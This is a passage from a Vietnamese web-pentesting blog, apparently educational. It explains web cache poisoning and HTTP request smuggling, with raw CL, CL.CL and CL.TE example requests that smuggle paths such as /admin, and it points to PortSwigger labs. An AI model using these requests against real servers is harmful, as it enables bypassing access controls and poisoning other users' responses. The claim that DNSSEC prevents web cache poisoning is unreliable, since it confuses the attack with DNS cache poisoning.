+<p> Về cơ bản, Web cache poisoning bao 3 bước. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li>Đầu tiên, kẻ tấn công phải tìm ra cách tạo ra response từ máy chủ back-end  bằng cách sử tìm thử các input không phải "cache key".</li><li>Tiếp theo là xem những chỗ input đó có thành lỗi được không.</li><li>Cuối cùng nếu có thì bắt đầu poison shared cache.  </li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p><strong>Xác định và đánh giá các input không phải key</strong></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Bất kỳ cuộc tấn công WCP nào đều phụ thuộc vào các input không phải key, chẳng hạn như các tiêu đề (header) . Bộ đệm web bỏ qua các đầu vào không phải key hoặc không bị khóa khi quyết định có nên trả về response được lưu trong bộ nhớ cache cho người dùng hay không. Điều có nghĩa là bạn có thể sử dụng các đầu vào không bị khóa để gửi payload của mình và tạo ra response bị "poisoned", nếu được lưu trong bộ nhớ cache, sẽ được trả về cho tất cả người dùng có yêu cầu có khóa bộ đệm tương ứng. Do đó, bước đầu tiên của cuộc tấn công WCP là xác định các đầu vào không bị khóa được máy chủ sử dụng .</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Bạn có thể xác định các đầu vào một cách thủ công bằng cách thêm các header vào các request và quan sát xem chúng có ảnh hưởng đến response hay không. Bạn có thể sử dụng các công cụ có khả năng chặn bắt và thay đổi gói tinh như <a rel="noreferrer noopener" aria-label="Burp Suite (opens in a new tab)" href="https://portswigger.net/burp/communitydownload" target="_blank">Burp Suite</a> của PortSwigger hoặc <a rel="noreferrer noopener" aria-label="ZAP  (opens in a new tab)" href="https://www.zaproxy.org/download/" target="_blank">ZAP </a>của OWASP. Cách có thể rất trực quan nhưng nó đòi hỏi nhiều công sức và thời gian. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"align":"center","width":399,"height":263} -->
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://www.vietsunshine.com.vn/wp-content/uploads/2018/09/H%C6%B0%E1%BB%9Bng-d%E1%BA%ABn-Pentest-Black-Box-s%E1%BB%AD-d%E1%BB%A5ng-Burp-Suite-Ph%E1%BA%A7n-1-1.jpg" alt="Hướng dẫn Pentest Black Box sử dụng Burp Suite (Phần 1)" width="399" height="263"/><figcaption>Burp Suite</figcaption></figure></div>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Thay vì vậy bạn có thể sử dụng các công cụ hỗ trợ như <a rel="noreferrer noopener" aria-label="Acunetix  (opens in a new tab)" href="https://www.acunetix.com/" target="_blank">Acunetix </a>- Scan lỗ hổng web tự động nhưng ta sẽ hơi bị động, <a rel="noreferrer noopener" aria-label="Param Miner (opens in a new tab)" href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943" target="_blank">Param Miner</a> - một extention của Burp Suite giúp xác định các tham số (parm) bị ẩn, không liên  kết, đặc biệt hữu ích để tìm lỗ hổng độc hại bộ đệm web. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Mình khuyến khích các bạn nên dùng Burp Suite, nó thực sự hiệu quả.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><strong>Tìm ra mục độc hại trong các phản hồi từ server của mỗi input</strong></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Khi bạn đã xác định được đầu vào không phải key hoặc không bị khóa, bước tiếp theo là đánh giá chính xác cách trang web xử lý nó. Hiểu điều này là điều cần thiết để có thể tạo ra response độc hại. Nếu như giá trị từ đầu vào được nằm trong response từ máy chủ mà không bị loại bỏ hoặc được sử dụng tạo đường dẫn đến dữ liệu khác (<strong>Host Header Attack</strong>), thì đây là yếu tố có khả năng để làm ngộ độc web cache.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><strong>Lấy phản hồi được lưu trữ</strong></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Bước này chỉ là để kiểm tra việc đầu độc web cache đã thành công hay chưa. Việc đầu độc cache chiếm 50% tỉ lệ thành công còn lại phụ thuộc vào nhiều yếu tố khác như extention của file,content type, router,status code và response header.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Bạn nên dành một chút thời gian để tìm hiểu về các header, các request đến các server khác nhau  và nghiên cứu cách bộ đệm hoạt động thì việc hiểu và thực hiện tấn công sẽ dễ dàng hơn.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Các mối đe dọa có thể xảy ra ?</h4>
+<!-- /wp:heading -->
+
+<!-- wp:image {"width":592,"height":159} -->
+<figure class="wp-block-image is-resized"><img src="https://portswigger.net/web-security/images/cache-poisoning.svg" alt="web cache poisoning" width="592" height="159"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p> Như với hầu hết các loại tấn công,  Web cache poisoning  cũng có thể được sử dụng kết hợp với các cuộc tấn công khác để leo thang tác động lớn hơn nữa ví dụ các lỗ hổng phổ biến như XSS, JavaScript inject, Open redirect, v.v. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Response độc hại chỉ ảnh hưởng đến người dùng truy cập trang bị ảnh hưởng trong khi cache bị đầu độc. Do đó, tác dộng có thể dao động từ không tồn tại đến lớn tùy thuộc vào việc trang có phổ biến hay không. Ví dụ, nếu kẻ tấn công quản lý để đầu độc một phản hồi được lưu trong bộ nhớ cache trên trang chủ của một trang web lớn như Facebook , thì cuộc tấn công có thể ảnh hưởng đến hàng ngàn người dùng mà không có bất kỳ tương tác nào sau đó từ kẻ tấn công. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Cách thức ngăn chặn lỗ hổng này</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Về vấn dề ngăn chặn lỗ hổng này mình không tìm được nhiều tài liệu chi tết. chỉ trung trung vào việc cấu hình năng cao cho việc lưu trữ vào cache trên server nhưng vấn đề còn phụ thuộc vào mục đích , công việc kinh doanh và do bên thứ 3 như các CDN.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Ngoài ra còn có các công cụ có sẵn để giúp các tổ chức ngăn chặn các cuộc tấn công ngộ độc cache. Công cụ ngăn chặn ngộ độc bộ nhớ cache phổ biến nhất có lẽ là DNSSEC ( Domain Name System Security Extension). DNSSEC là một công cụ chống độc cache được phát triển bởi Lực lượng đặc nhiệm kỹ thuật Internet ( &nbsp;Internet Engineering Task Force ) để cung cấp xác thực dữ liệu DNS an toàn. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Ok như vậy là minh đã xong phần giới thiệu về lỗ hổng Web Cache Poisoning , trong phần tiếp theo mình sẽ trình bày các kĩ thuật và cách đầu độc Cache. Cảm ơn và mời các bạn đón đọc!!!! Bye</p>
+<!-- /wp:paragraph -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/15/WEB%20Pentesting/Web%20Server/Web%20Cache%20Poisoning%20%20(Part%201)/" data-id="ckbgnw3830006jnjm0ncwgqod" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-WEB Pentesting/Web Server/HTTP Request Smuggling Attack" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/15/WEB%20Pentesting/Web%20Server/HTTP%20Request%20Smuggling%20Attack/" class="article-date">
+  <time datetime="2020-06-15T15:22:09.484Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/15/WEB%20Pentesting/Web%20Server/HTTP%20Request%20Smuggling%20Attack/">WEB Pentesting/Web Server/HTTP Request Smuggling Attack</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- wp:paragraph -->
+<p> Một trong các lỗ hổng  dựa vào tính năng của giao thức HTTP từ đó tạo các các thông điệp HTTP message đặc biệt ,phía server sẽ phân tích và diễn giải các message nhận được theo ý của attacker. HTTP Request Smuggling gọi tắt là HRS là một kĩ thuật , phương tiện tấn công năng cao, được công bố trong một <a rel="noreferrer noopener" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank">tài liêu</a> vào năm 2005 bởi một công ty công nghệ Wathfire . HRS là kĩ thuật can thiệp vào việc xử lý tuần tự các  HTTP request tới một web site từ một hoặc nhiều user.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/http-request-smuggling.svg" alt="What is HTTP request smuggling? Tutorial &amp; Examples | Web Security ..."/><figcaption>src: PortSwigger</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Lỗ hổng này thường được đánh giá ở mức Critical do HRS có khả năng bypass các kiểm soát truy cập, tường lửa web. Ngoài ra HRS còn là phương tiện để thực hiện các cuộc tấn công nguy hiểm khác như Web Cache Poisoning , Cross Site Scripting, Session Hijacking, Server-Side Requesr Forgery,Open Redirect,... Danh sách này còn có thể còn nhiều hơn nữa bởi còn nhiều kiểu tấn công chưa được khám phá.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":4} -->
+<h4> HTTP Request Smuggling sinh ra từ đâu?</h4>
+<!-- /wp:heading -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://documentation.help/DogeTool-HTTP-Requests-vt/http_requestmessageexample.png" alt="HTTP Request Message - HTTP Requests Documentation"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Hình trên là miêu tả các thành phần của một request, reponse chỉ hơi khác một chút , bây giờ mình cùng xem qua quy trình một gói request được xử lí nào !</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Nhìn vào dòng request line ta sẽ thấy được server đang sử dụng giao thức HTTP/1.1 . Hiện nay  mặc dù Htpp/2 đã ra mắt để dần thay thế nó hay thậm chí Http/3 cũng được đề cập đến nhưng version này vẫn được sử dụng rất phổ biến rất , nó là bản nâng cấp của Http/1.0 với một tính năng mới cực kì hiệu quả cho việc truyền tải là 2 ae <code>Keep-Alive và Pipeline</code>. Để biết rõ về khác biệt giữa các version này là gì các bạn có thể tham khảo <a rel="noreferrer noopener" href="https://kipalog.com/posts/Luoc-su-tu-HTTP-1-toi-HTTP-2-va-tuong-lai-cua-HTTP" target="_blank">bài viết</a> này. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Một trong những vấn đề của Http 1.0 đó chính là chỉ có thể một connection tới một tài nguyên dẫn đến hiệu suất thấp và tốn nhiều thời gian,lưu lượng do quá trình bắt tay 3 bước TCP . Vì thế 2 tính năng Keep-Alive và Pipeline đã được thêm vào trong bản Http/1.1 để có thể tạo một connection tải nhiều tài nguyên . Với tính năng Keep-Alive, request sẽ được thêm một header đặc biệt là <code>Connection: Keep-Alive</code> , phía máy chủ sẽ nhận được request và hiểu là không được đóng kết nổi TCP , tương tự phía server sẽ dùng lại cái kết nối TCP này .Như vậy chỉ cần thực hiện một lần bắt tay ba bước , điều này có thể giảm lưu lượng tới máy chủ, tiết kiệm tài nguyên và tăng tốc truy cập. Tính năng này được bật mặc đinh khi sử dụng giao thức Http/1.1.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Đi cùng với Keep-Alive đó là Pipeline, để giải quyết vấn đề lộn xộn khi nhiều request cùng một lúc và thời gian khi phải chờ dợi response của request trước để thực hiện request tiếp theo trong cùng một connection.Http Pipeline sẽ cho phép việc gửi request liên tục mà không cần phải chờ đợi response của request trước nhưng vẫn phải theo tuần tự vào trước thì nhận trước. Tính năng này có một nhược điểm là nếu request trước nhận response chậm thì các request sau cũng phải chờ cho xong mới được nhận response của mình. Nhược điểm này còn có tên là head-of-line blocking, vấn đề này đã được khắc phục ở Http/2 và một biện pháp không liên quan nhưng lại có thể làm người ta quên đi pipeline nữa đó chính là <a rel="noreferrer noopener" href="http://hydrasky.ml/2020/03/web-cache" target="_blank">CACHE</a> (tham khảo bài viết của mình). Cache rất hữu ích vì nó sẽ đưa HRS thành Web Cache Poisoning hehe.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Thực ra chúng ta chỉ cần quan tâm vè Keep-Alive cho lỗ hổng này, còn Pipeline thì không cần thiết vì tính năng này phức tạp,chứa nhược điểm lớn nên bình thường nó ko được dùng và bị disable trên trình duyệt,còn phía server vẫn hỗ trợ cho connection nào cần. Nhưng nói rồi thì nói luôn cho đỡ thắc mắc và mình đỡ quên hehe.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Ok như vậy với tính năng Keep-Alive ,request sẽ được  forward lần lượt đến Back-End Server thông qua Front-End Server (Proxy server, load banacer ) trên cùng một connection TLS/TCP. Ngoài ra khi đến Front-End Server,request cũng sẽ được phân tích để lưu vào cache .</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"width":584,"height":328} -->
+<figure class="wp-block-image is-resized"><img src="https://portswigger.net/web-security/images/forwarding-http-requests-to-back-end-server.svg" alt="What is HTTP request smuggling? Tutorial &amp; Examples | Web Security ..." width="584" height="328"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Sau khi nhận request Back-End server sẽ phân tích các header của request để xác định khi nào sẽ kết thúc  một request vừa nhận và nhận request tiếp theo.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Lợi dụng điều này Attacker gửi một requets thập cẩm(nhưng có tính toán nha) để  lừa front-end server đó là 1 reuqest hợp lệ và chuyển tiếp đến Back-End. BE said " bạn cho thì mình lấy thôi" , rồi  khi phân tích request  Back-End hiểu lầm là một phần của request thập cẩm đó là điểm bắt đầu và nó sẽ được gộp vào request sau đó (như phích và ổ cắm haha ). </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/smuggling-http-request-to-back-end-server.svg" alt="What is HTTP request smuggling? Tutorial &amp; Examples | Web Security ..."/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Sau đó request vẫn được thực hiện một cách hợp lệ response sẽ được trả về  ,như vậy attacker đã can thiệp vào việc xử lí của ứng dụng. =&gt; Smuggling attack !!!</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://memn0ps.github.io/images/2019-09-13-HTTP-Request-Smuggling-CL-TE/screenshot2.png" alt="screenshot2"/><figcaption>Ví dụ minh họa</figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:heading {"level":4} -->
+<h4>Cách thức tấn công HTTP request smuggling</h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Như mình đã giới thiệu bên trên, HRS lần đầu tiên được đưa ra vào <a rel="noreferrer noopener" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank">tài liệu</a> năm 2005 bởi Watchfire, trong đó có nhắc đến 2 kiểu được sử dụng là CL và CL.CL, nhưng do nó là kĩ thuật quá khó và chỉ ảnh hưởng đến người dùng nên nó bị bỏ qua.Và đến năm 2019, Jame Kettle đã làm cho nó sống lại với <a rel="noreferrer noopener" href="https://www.youtube.com/watch?v=w-eJM2Pc0KI" target="_blank">HTTP Desync Attacks</a> tại Black Hat và DEF CON cùng với đó là 3 kiểu mới được đưa ra là CL.TE, TE.CL và TE.TE.  Như vậy có thể chia ra làm 5 kiểu : CL, CL.CL, CL.TE, TE.CL và TE.TE, mình sẽ giải thích hết luôn hehe.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>  CL và TE lần lượt viết tắt của <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length" target="_blank">Content-Length</a> và <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank">Transfer-Encoding</a> là 2 HTTP header . Content-Length cho biết kích thước của body của request, tính bằng byte, được gửi cho người nhận còn Transfer-Encoding chỉ định hình thức mã hóa (gzip, chunked.compress....) được sử dụng để đóng gói vận chuyển phần body một cách nhanh chóng, giải quyết được vấn đề của <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length" target="_blank">Content-Length</a> với dữ liệu lớn. Nhưng  tính năng quan trọng cần nhớ ở đây là 2 header này còn là cách xác định kết thúc một HTTP message. Đây là mấu chốt để thực hiện HRS ! </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>À còn một vấn đề nữa trước khi vào vấn đề là việc sử dụng các method HTTP (GET , POST, PUT ...) phải hợp lí, không thể dùng bừa bởi vì mỗi methob đều có chức năng riêng và server sẽ xử lí khác nhau. Thế nên nó cũng ảnh hưởng đén việc tấn công bằng HRS,mình sẽ không thể giải thích cả vì nó sẽ quá dài mong các bạn lưu ý cả phần này. OK vào thôi  !</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":3} -->
+<h3><strong>GET Request với CL </strong></h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Trong kiểu này không phải chỉ request GET có thể sử dụng, mình chỉ lấy như một ví dụ vì nó rất là điển hình.&nbsp;Tất cả các yêu cầu HTTP không mang body đều có khả năng làm điều này nhưng mình chưa biết hết hihi.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Trong tài liệu của <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Request_for_Comments" target="_blank">RFC</a> về HTTP/1.1 - <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616" target="_blank">RFC2616</a> không có quy định nào đề ra về việc cho phép yêu cầu GET mang thêm Body trong request như request POST và chỉ có một câu được đề cập trong phần 4.3.1 của tài liệu mới nhất của nó là  <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc7231#section-4.3.3" target="_blank">RFC7231</a>.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>Sending a payload body on a GET request might cause some existing implementations to reject the request</p><cite>Gửi payload body trong một Get request có thể là nguyên nhân dẫn đến request bị từ chối thực hiện..</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Giả sử Front-End Server (Proxy Server) cho phép  GET request mang Body và Back-end Server không cho phép GET request mang Body.&nbsp;Như vậy Back-end Server sẽ  bỏ qua luôn&nbsp;<code>Content-Length</code> header trong request GET và sẽ không xử lý nó.&nbsp;Điều này có thể dẫn đến request Smuggling. Cùng xem ví dụ nha.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>GET / HTTP/1.1\r\n
+Host: example.com\r\n
+Content-Length: 44\r\n # 44 byte
+
+GET / secret HTTP/1.1\r\n #độ dài của đoạn
+Host: example.com\r\n     # này bằng 44 byte 
+\r\n</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>Front-end Server nhận được request và kiểm tra&nbsp;<code>Content-Length</code>, xác định rằng đây là một request hoàn chỉnh và  chuyển tiếp nó đến back-end Server.&nbsp;Sau đó back-end Server nhận được nó, vì nó không xử lý&nbsp;<code>Content-Length</code>,  nên nó nghĩ rằng nó đang nhận được hai request. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>First request 
+GET / HTTP/1.1\r\n
+Host: example.com\r\n
+
+Second request 
+GET / secret HTTP/1.1\r\n
+Host: example.com\r\n</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>Done !!!</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":3} -->
+<h3>CL.CL</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Trong mục 4.4 của <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616#section-4.4" target="_blank">RFC2616</a> và mục 4 của 3.3.3 trong  <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank">RFC7230</a>, có ghi rằng khi request  mà máy chủ nhận được chứa hai hoặc nhiều hơn Content-Length header và  giá trị của các header này khác nhau thì nó sẽ trả về status code 400 hoặc 502. Như vậy khả năng cáo Server sẽ không chấp nhận request kiểu này và cũng vì thế người ta chỉ coi kiểu này chỉ ở mức ý tưởng. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:quote -->
+<blockquote class="wp-block-quote"><p>If a message is received without Transfer-Encoding and with<br>either multiple Content-Length header fields having differing<br>field-values or a single Content-Length header field having an<br>invalid value, then the message framing is invalid and the<br>recipient MUST treat it as an unrecoverable error. If this is a<br>request message, the server MUST respond with a 400 (Bad Request)<br>status code and then close the connection. If this is a response<br>message received by a proxy, the proxy MUST close the connection<br>to the server, discard the received response, and send a 502 (Bad Gateway) response to the client. If this is a response message<br>received by a user agent, the user agent MUST close the<br>connection to the server and discard the received response.</p><cite>Các bạn tự dịch nhé !</cite></blockquote>
+<!-- /wp:quote -->
+
+<!-- wp:paragraph -->
+<p>Nó đã được fix nhưng không sao mình vẫn sẽ trình bày về nó như trong tài liệu của Watchfire sử dụng nó để thực hiện HRS thành công.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Lần này mình lấy ví dụ dùng POST request,không như GET, server sẽ kiểm tra cả CL header để lấy dữ liệu  nhé !</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>POST / HTTP/1.1\r\n
+Host: example.com\r\n
+Content-Length: 8\r\n
+Content-Length: 7\r\n
+
+12345\r\n
+a</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>Theo như minh tìm hiểu nếu như sử dụng 2 header CL thì thông thường Proxy Server sẽ lấy Content-Length đầu tiên còn Back-End sẽ phân tích và lấy Content-Length cuối cùng, tại sao thì mình chưa tìm ra nhưng nó không ảnh hưởng lắm nên thôi .</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p> Lúc này độ dài của dữ liệu mà Proxy Server nhận được là 8 bytes , kiểm tra nội dung "12345\r\na" đã đủ và nó chuyển tiếp request như vậy đến BE server.&nbsp;Khi đến Back-end Server sẽ lấy giá trị của CL header cuối  là 7 bytes . Sau khi đọc 7 ký tự đầu tiên "12345\r\n" (Để lại "a" trong cache huhu), Back-end Server xác định rằng request đã được đọc và kết thúc request (Server sẽ gửi response tương ứng cho request này ).&nbsp;Như vậy cache vẫn còn có giữ chữ "a" thừa từ request trước.&nbsp;Lúc này Back-end Server cho rằng "<code>a"</code>là một phần của request tiếp theo.&nbsp;Nếu như thời điểm này có mình hoặc một người dùng thường khác gửi request đến Server như sau:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>GET /index.html HTTP/1.1\r\n
+Host: example.com\r\n</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>Như chúng ta đã biết từ trước, các kết nối TCP thường được sử dụng lại giữa máy chủ proxy và máy chủ nguồn. Nên request này sẽ được ghép vào sau  "a" giống như ổ cắm - Jame Kettle nói . Khi đó Back-end Server nhận được request như này :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>aGET /index.html HTTP/1.1\r\n
+Host: example.com\r\n</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>Làm gì có method aGET đúng không các bạn ? Server sẽ xử lí và trả về một lỗi tương tự như&nbsp; "aGET request method not found".Như vậy là bạn đã có thể thực hiện một cuộc tấn HRS hay làm ảnh hưởng yêu cầu của người dùng khác và thậm trí mở rộng thành một cuộc tấn công khác như CSRF.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":3} -->
+<h3>CL-TE</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p> CL-TE có nghĩa là khi nhận được request có hai header này,  proxy server chỉ xử lý header Content-Length còn Back-End Server phía sau sẽ tuân thủ các quy định về <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616" target="_blank">RFC2616</a>, bỏ qua Content -Length, xử lý header Transfer-Encoding.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Transfer-Encoding có thể chỉ định nhiều kiểu mã hóa nhưng chúng ta chỉ cần quan tâm đến chunked -mã hóa kiểu khối .Định dạng dữ liệu chuyển kiểu khối như sau:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>&#91;chunk size]&#91;\r\n]&#91;chunk data]&#91;\r\n]&#91;chunk size]&#91;\r\n]&#91;chunk data]&#91;\r\n]&#91;chunk size = 0]&#91;\r\n]&#91;\r\n]</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p> trong đó giá trị của "size" được biểu thị bằng hệ thập lục phân. Khi chunk size bằng không có nghĩa là kết thúc nội dung của body.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"align":"center","width":349,"height":380} -->
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://lh3.googleusercontent.com/proxy/BImzadzTUYQ7CwIpg0EV8EpAxyOQvlEybJun0Ij3NIyg2N1k21fQfUISY4EQy76W_8oLvvMfkYXZXHrvsHGq" alt="HTTP Hyper Text Transfer Protocol (2)" width="349" height="380"/><figcaption>Ví dụ minh họa</figcaption></figure></div>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Mình sẽ sử dụng lab của PortSwigger để làm lấy ví dụ luôn cho sinh động  ( thực tế sẽ khó hơn nhé) cùng với đó mình sẽ sử dụng BurpSuite và extention <a rel="noreferrer noopener" href="https://github.com/PortSwigger/http-request-smuggler" target="_blank">Http request Smuggler</a> của nó (Các bạn tự tìm hiểu nha) :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noreferrer noopener">Link lab Portswigger</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Đây là request mình sẽ check đầu tiên , cung như là cấu trúc của một packet CL.TE:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":203,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-3.png" alt="" class="wp-image-203"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Vì Front-End Server xử lí  Content-Length, sau khi kiểm tra độ dài của payload body đúng là 36, FE coi đây là một request hoàn chỉnh và forward nó đi. </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Chắc chắn sẽ có bạn thắc mắc về độ cài của body của request khi nhận được.Bạn nhìn  và đếm rõ rảng không đủ 36 bytes như content length hiện. Đây là do trong body còn dùng 2 kí tự ngắt dòng là &nbsp;CR (\r)  và LF  (\n), trong các ví dụ hình ảnh mình đưa ra sẽ lược bỏ nó đi cho đỡ rối mắt. :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:preformatted -->
+<pre class="wp-block-preformatted">0 \ r \ n
+\ r \ n
+GET /admin HTTP/1.1</pre>
+<!-- /wp:preformatted -->
+
+<!-- wp:paragraph -->
+<p>Tiếp tục,khi gói tin được chuyển đến thì back-end sẽ xử lý&nbsp;<code>Transfer-Encoding</code> header.Nhưng đập vào mắt nó là  "0 \ r \ n", nên Back-end cho rằng đã kết thúc request,để lại đoạn "GET /admin HTTP/1.1" trong cache, chờ đợi request tiếp theo đến. Kết quả trong lab mình thực hiện sẽ như thế này:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":202,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-2.png" alt="" class="wp-image-202"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ok như vậy là đã có dấu hiệu để thực hiện tấn công HRS.  Phân còn lại các bạn nên tự khám phá nha.</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:heading {"level":3} -->
+<h3>TE.CL</h3>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Khi bạn hiểu được CL.TE rồi thì đối với kiểu này nó cũng tương tự chỉ là đảo vế cho nhau thôi ( FE sẽ xử lí TE còn BE xử lí CL).PortSwigger cũng có lab  tương tự :</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noreferrer noopener">Link lab Portswigger</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":204,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/image-4.png" alt="" class="wp-image-204"/></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Request đến FE và xử lí TE, khi nó đọc dến "0 \ r \ n \ r \ n", nó coi là dã đọc xong, request hoàn chỉnh và  chuyển tiếp đến máyBE  server. BE server xử lý CL,khi nó đọc đến "12 \ r \ n:, nó coi như là request đã kết thúc. Còn phần còn lại thì nó cho là của một yêu cầu khác</p>
+<!-- /wp:paragraph -->
